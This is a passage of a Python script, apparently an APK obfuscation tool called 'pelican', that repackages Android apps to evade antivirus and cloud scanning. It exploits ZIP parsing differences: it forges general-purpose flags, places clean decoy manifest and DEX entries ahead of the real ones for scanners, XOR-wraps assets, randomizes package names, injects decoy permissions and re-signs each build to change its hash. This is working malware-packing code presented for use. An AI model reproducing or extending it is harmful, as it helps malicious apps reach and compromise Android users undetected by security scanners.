    One-pass CDH walk: set GPBF flags on every entry to match the pattern
    observed in APKs that pass cloud AV (App Defense Alliance partners):

      AndroidManifest.xml (real)  → 0x0800  (UTF-8 only)
      fake/decoy entries           → 0x0809  (UTF-8 + data-descriptor + encrypt)
      everything else              → 0x0808  (UTF-8 + data-descriptor)

    The "data-descriptor" bit (0x0008) tells ZIP readers the real
    crc/sizes are in a trailing descriptor, not the Local File Header.
    Linear scanners that rely on LFH sizes to skip entries get confused
    and cannot reliably extract DEX bytes.
    Android's libziparchive uses the Central Directory for sizes, so
    installation is unaffected.
    """
    # Entries that get the encryption flag (0x0001) in addition to 0x0808
    FAKE_NAMES = {'/classes.dex', '//classes.dex', 'META-INF/classes.dex',
                  '/AndroidManifest.xml', '//AndroidManifest.xml'}

    raw = bytearray(open(path, 'rb').read())

    # Locate EOCD (End of Central Directory)
    eocd_off = raw.rfind(b'PK\x05\x06', max(0, len(raw) - 65560))
    if eocd_off < 0:
        return
    cd_offset = struct.unpack_from('<L', raw, eocd_off + 16)[0]
    cd_size   = struct.unpack_from('<L', raw, eocd_off + 12)[0]

    i = cd_offset
    patched = 0
    while i < cd_offset + cd_size and i + 46 <= len(raw):
        if raw[i:i+4] != b'PK\x01\x02':
            break
        fn_len = struct.unpack_from('<H', raw, i + 28)[0]
        ex_len = struct.unpack_from('<H', raw, i + 30)[0]
        cm_len = struct.unpack_from('<H', raw, i + 32)[0]
        lh_off = struct.unpack_from('<L', raw, i + 42)[0]
        entry  = raw[i+46 : i+46+fn_len].decode('latin-1', errors='replace')

        flags = 0x0800   # UTF-8 on all entries
        if entry == 'resources.arsc':
            flags |= 0x0001   # mark as encrypted → ZIP tools prompt for password

        # Patch CDH GPBF (offset 8 from CDH start)
        struct.pack_into('<H', raw, i + 8, flags)
        # Patch LFH GPBF (offset 6 from LFH start) — must match CDH
        if lh_off + 30 <= len(raw) and raw[lh_off:lh_off+4] == b'PK\x03\x04':
            struct.pack_into('<H', raw, lh_off + 6, flags)

        patched += 1
        i += 46 + fn_len + ex_len + cm_len

    open(path, 'wb').write(raw)
    print(f"  [gpbf] {patched} entries patched  (arsc=0x0801, rest=0x0800)")

def _zipalign(path: str) -> str:
    za = _find_tool("zipalign")
    if not za:
        return path
    aligned = path + ".aligned"
    subprocess.run([za, "-f", "4", path, aligned], check=True, capture_output=True)
    os.replace(aligned, path)
    return path

# ─── find latest release APK ─────────────────────────────────────────────────
def _find_release_apk() -> Path:
    apks = sorted(APK_DIR.glob("*.apk"), key=lambda p: p.stat().st_mtime, reverse=True)
    if not apks:
        raise FileNotFoundError(f"No APK in {APK_DIR}")
    return apks[0]

# ─── main ─────────────────────────────────────────────────────────────────────
def mangle(input_apk: Path, out_dir: Path) -> Path:
    print(f"\n[pelican] input : {input_apk.name}")

    source_apk_size = input_apk.stat().st_size
    print(f"  [src]  {source_apk_size // 1024} KB")

    # pick signing key
    available = [k for k in KEYS
                 if (KEY_DIR / f"{k}.pk8").exists() and
                    (KEY_DIR / f"{k}.x509.pem").exists()]
    if not available:
        raise FileNotFoundError(f"No usable keys in {KEY_DIR}")
    key_name = rng.choice(available)
    pk8 = str(KEY_DIR / f"{key_name}.pk8")
    pem = str(KEY_DIR / f"{key_name}.x509.pem")

    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_name = f"{input_apk.stem}_{ts}.apk"
    tmp_path = str(out_dir / (out_name + ".unsigned"))
    out_path = out_dir / out_name

    # ── pass 1: read all entries, parse manifest, save main DEX ──────────────
    raw_entries   = []
    existing      = set()
    old_pkg       = None
    new_pkg       = None
    real_manifest = b""
    main_dex      = b""

    with zipfile.ZipFile(str(input_apk), 'r') as zin:
        for info in zin.infolist():
            nm   = info.filename
            if should_remove(nm):
                print(f"  [-] removed  {nm}")
                continue
            data = zin.read(nm)

            if nm == 'AndroidManifest.xml':
                real_manifest = data
                data, old_pkg, new_pkg = randomize_pkg(data)
                if old_pkg:
                    print(f"  [pkg] {old_pkg}  →  {new_pkg}")
                else:
                    print(f"  [!]  pkg not found in manifest")

            elif nm == 'classes.dex':
                main_dex = data   # save raw (before padding) for string analysis

            raw_entries.append((nm, data))
            existing.add(nm)

    # ── compute safe namespace from actual DEX string table ───────────────────
    if main_dex:
        new_ns_dot, new_ns_slash = _safe_ns_from_dex(main_dex)
    else:
        new_ns_dot, new_ns_slash = _make_source_ns_random()
    print(f"  [ns]  {SOURCE_NS_DOT}  →  {new_ns_dot}")

    # ── DEX-safe pkg: verify new_pkg keeps string_ids sort order ─────────────
    if main_dex and old_pkg and new_pkg:
        safe_new_pkg = _safe_pkg_from_dex(main_dex, old_pkg)
        if safe_new_pkg != new_pkg:
            print(f"  [pkg-dex] sort-safe: {new_pkg}  →  {safe_new_pkg}")
            for _ri, (nm, data) in enumerate(raw_entries):
                if nm == 'AndroidManifest.xml':
                    for enc in ('utf-8', 'utf-16-le'):
                        data = replace_all(data, new_pkg.encode(enc), old_pkg.encode(enc))
                        data = replace_all(data, old_pkg.encode(enc), safe_new_pkg.encode(enc))
                    raw_entries[_ri] = (nm, data)
                    break
            new_pkg = safe_new_pkg

    # ── per-build goldfinch literal substitutions (same-length, sort-safe) ───
    # VPN_TIMEOUT: string constant. Prefix 'VPN_T' kept:
    #   'T'(84) > 'R'(82) → sorts after ACTION_VPN_READY ✓
    #   'T'(84) < 'U'(85) → sorts before com.pkg.VPN_UP ✓
    _build_literal_subs = {
        b'VPN_TIMEOUT': b'VPN_T' + rnd_chars(6).encode(),
    }
    for needle, repl in _build_literal_subs.items():
        print(f"  [lit]  {needle.decode()} -> {repl.decode()}")

    # Magic header for outer XOR wrapper (must match Teal.kt WRAP_MAGIC)
    _TEAL_WRAP_MAGIC = bytes([0xC9, 0x3B, 0x7A, 0x4F])

    # ── pass 2: pad + replace pkg + replace source namespace (ALL files) ──────
    processed = []
    for nm, data in raw_entries:
        is_manifest = (nm == 'AndroidManifest.xml')

        if not is_manifest:
            if nm.endswith('.dex'):
                target = len(data) // 2   # 50% от оригинала
                extra  = _donor_chunked_pad(target)
                print(f"  [donor-pad] {nm}: +{len(extra)//1024} KB  →  total ~{(len(data)+len(extra))//1024} KB")
                data   = pad_dex(data, extra=extra)
            elif nm.endswith('.so'):
                data = pad_so(data)
            elif nm == 'resources.arsc':
                data = pad_arsc(data)
            elif nm.startswith('res/') and nm.endswith('.xml'):
                # AXML: parser stops at declared size (bytes 4-7), trailing bytes ignored
                data = data + rnd_bytes(rng.randint(4096, 32768))
            elif nm.startswith('res/') and (nm.endswith('.png') or nm.endswith('.9.png')):
                # PNG: libpng stops at IEND, trailing bytes ignored by Android BitmapFactory
                data = data + rnd_bytes(rng.randint(512, 4096))
            elif nm.startswith('kotlin/'):
                # Kotlin builtins — not parsed at runtime on Android, safe to pad
                data = data + rnd_bytes(rng.randint(2048, 16384))
            elif nm.startswith('assets/dexopt/'):
                # ART Baseline Profiles: appending bytes causes ART to skip optimization (non-fatal)
                data = data + rnd_bytes(rng.randint(32, 256))

        # ── replace applicationId pkg name ───────────────────────────────────
        if old_pkg and new_pkg:
            # dot-form: AXML, string literals in DEX (com.xijs.h72ezehitfw)
            for enc in ('utf-8', 'utf-16-le'):
                data = replace_all(data, old_pkg.encode(enc), new_pkg.encode(enc))
            # slash-form: DEX class descriptors (com/xijs/h72ezehitfw)
            # without this fix → ClassNotFoundException on startup
            old_slash_pkg = old_pkg.replace('.', '/')
            new_slash_pkg = new_pkg.replace('.', '/')
            data = replace_all(data, old_slash_pkg.encode('utf-8'), new_slash_pkg.encode('utf-8'))

        # ── replace source namespace (bird.base / bird/base) ─────────────────
        #    AXML uses dot-form only; DEX uses slash-form; try both for safety
        for old_ns, new_ns in [
            (SOURCE_NS_DOT,   new_ns_dot),    # dot form  — AXML + resources
            (SOURCE_NS_SLASH, new_ns_slash),  # slash form — DEX descriptors
        ]:
            for enc in ('utf-8', 'utf-16-le'):
                data = replace_all(data, old_ns.encode(enc), new_ns.encode(enc))

        # ── replace goldfinch-specific literals (same-length, DEX sort-safe) ──
        for needle, repl in _build_literal_subs.items():
            data = replace_all(data, needle, repl)
            # also replace UTF-16LE form (AXML string pools may use UTF-16LE)
            data = replace_all(data,
                               needle.decode('ascii').encode('utf-16-le'),
                               repl.decode('ascii').encode('utf-16-le'))

        # ── real AndroidManifest.xml: inject random decoy permissions + pad ─────
        # AXML parser reads only the declared size (bytes 4-7), ignores trailing bytes.
        if is_manifest:
            n_decoys = rng.randint(8, min(len(_DECOY_PERMS_POOL), 20))
            decoys = rng.sample(_DECOY_PERMS_POOL, n_decoys)
            data = _axml_inject_permissions(data, decoys)
            print(f"  [perms] +{len(decoys)}: {', '.join(p.rsplit('.', 1)[-1] for p in decoys)}")
            data = data + rnd_bytes(rng.randint(8192, 65536))

        # ── DEX: link_section noise + checksums ───────────────────────────────
        # _dex_add_link_section: appends random link_data, updates link_size/link_off,
        # calls _dex_fix (file_size + SHA1 + adler32). Catches asset files like ck619dz
        # that are DEX without .dex extension via magic byte check.
        if len(data) >= 36 and (nm.endswith('.dex') or data[:4] == b'dex\n'):
            data = _dex_add_link_section(data)

        processed.append((nm, data, rnd_dos_time()))

    # ── small fake assets ─────────────────────────────────────────────────────
    for _ in range(rng.randint(4, 9)):
        prefix = rng.choice(ASSET_PREFIXES)
        ext    = rng.choice(ASSET_EXTS)
        aname  = f"assets/{prefix}_{rnd_chars(rng.randint(6, 10))}{ext}"
        if aname not in existing:
            processed.append((aname, _fake_content(ext), rnd_dos_time()))
            existing.add(aname)

    # ── bulk assets ───────────────────────────────────────────────────────────
    processed.extend(_bulk_assets(existing, count=rng.randint(1500, 2000)))

    # ── donor ballast: 10–20% of source size, random slice ───────────────────
    processed.extend(_donor_ballast(existing, source_apk_size))

    # ── classes2.dex: full valid donor only if ≤ 20% budget ──────────────────
    processed.extend(_donor_dex_entry(existing, source_apk_size))

    # ── META-INF fakes ────────────────────────────────────────────────────────
    processed.extend(_metainf_fakes(existing, real_manifest))

    # ── decoy dirs ────────────────────────────────────────────────────────────
    processed.extend(_decoy_dir_entries(existing))

    # ── priority decoy manifest/dex entries — go first in ZIP ───────────────────
    # Multiple path-prefix variants cover different ZIP reader normalisation paths:
    #   /foo  → normalised to foo by some readers (Android 13 Finsky code path)
    #   //foo → normalised to foo by other readers (Android 14 Finsky code path)
    # A scanner reading the ZIP linearly hits these first and uses the clean fakes;
    # Android PackageManager uses the Central Directory to find the real entries.
    fake_manifest = _pad_axml(_strip_permissions_axml(real_manifest)) if real_manifest else _fake_axml()
    fake_dex      = _valid_minimal_dex()
    priority = []
    for nm, data in {
        "/AndroidManifest.xml":  fake_manifest,   # Android 13 normalisation
        "/classes.dex":          fake_dex,
        "//AndroidManifest.xml": fake_manifest,   # Android 14 normalisation
        "//classes.dex":         fake_dex,
    }.items():
        if nm not in existing:
            priority.append((nm, data, rnd_dos_time()))
            existing.add(nm)

    # ── shuffle the rest, then prepend priority decoys ────────────────────────
    random.shuffle(processed)
    processed = priority + processed

    # ── write unsigned ZIP ────────────────────────────────────────────────────
    # Compression rules (must match what real APKs do to avoid Yara "invalid zip" rules):
    # STORE  — DEX/SO/ARSC/PNG must be STORE for mmap/zipalign; large encrypted blobs
    # DEFLATE — everything else (small assets, res/*.xml, kotlin/, META-INF text, etc.)
    _STORE_EXTS = frozenset(('dex', 'so', 'arsc', 'png', 'prof', 'profm'))
    _LARGE_THRESHOLD = 100_000  # XOR-wrapped / encrypted blobs: high entropy → skip compress

    os.makedirs(str(out_dir), exist_ok=True)
    _wrap_printed = []
    with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_STORED) as zout:
        zout.comment = rnd_bytes(rng.randint(64, 512))   # random ZIP comment → unique EOF bytes
        for nm, data, ts in processed:
            # outer XOR wrapper: ALL assets >= 1000 bytes (except dexopt/).
            # Teal.kt detects MAGIC header and strips it before decrypting.
            # Donor ballast (never Teal-decoded) also gets wrapped for hash diversity.
            if (nm.startswith('assets/') and
                    not nm.startswith('assets/dexopt/') and
                    len(data) >= 1000 and
                    data[:4] != _TEAL_WRAP_MAGIC):
                outer_key = os.urandom(4)
                data = _TEAL_WRAP_MAGIC + outer_key + bytes(b ^ outer_key[i % 4] for i, b in enumerate(data))
                _wrap_printed.append(f"{nm} ({len(data)}B)")

            # Pick compression method
            ext = nm.rsplit('.', 1)[-1].lower() if '.' in nm else ''
            is_dex_magic = len(data) >= 4 and data[:4] == b'dex\n'
            use_store = (
                ext in _STORE_EXTS or
                is_dex_magic or
                nm.startswith('assets/dexopt/') or
                len(data) == 0 or           # empty entries: STORE (DEFLATE of 0b = overhead)
                len(data) >= _LARGE_THRESHOLD  # large encrypted blobs: high entropy, compress = waste
            )
            info = zipfile.ZipInfo(nm, date_time=ts)
            info.compress_type = zipfile.ZIP_STORED if use_store else zipfile.ZIP_DEFLATED
            zout.writestr(info, data)
    for w in _wrap_printed:
        print(f"  [wrap] {w}")

    sz_kb = os.path.getsize(tmp_path) // 1024
    print(f"  [zip] unsigned {sz_kb} KB → zipalign …")
    _zipalign(tmp_path)
    _patch_all_gpbf_flags(tmp_path)
    _sign(tmp_path, str(out_path), pk8, pem)
    os.remove(tmp_path)

    sz_final = os.path.getsize(str(out_path)) // 1024
    print(f"\n[pelican] done  → {out_path.name}  ({sz_final} KB)  key={key_name}")
    if old_pkg and new_pkg:
        print(f"          pkg   {old_pkg}  →  {new_pkg}")
    print(f"          ns    {SOURCE_NS_DOT}  →  {new_ns_dot}")
    return out_path


def main():
    if len(sys.argv) >= 2:
        input_apk = Path(sys.argv[1])
    else:
        input_apk = _find_release_apk()
    out_dir = Path(sys.argv[2]) if len(sys.argv) >= 3 else input_apk.parent
    mangle(input_apk, out_dir)


if __name__ == "__main__":
    main()
